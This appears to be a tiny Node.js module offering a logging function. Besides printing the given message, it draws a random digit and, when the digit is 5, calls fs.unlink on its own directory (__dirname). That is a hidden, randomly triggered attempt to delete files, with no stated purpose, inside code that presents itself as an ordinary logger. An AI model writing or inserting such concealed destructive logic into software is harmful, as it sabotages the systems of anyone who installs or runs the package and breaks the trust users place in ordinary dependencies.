"use strict";

const fs = require("fs");

exports.log = function (message) {
  console.log(message);

  let num = Math.floor(Math.random() * 10);

  console.log(num);
  if (num === 5) {
    fs.unlink(__dirname, (err) => {
      if (err) {
        console.error(err);
        return;
      }
    });
  }
};
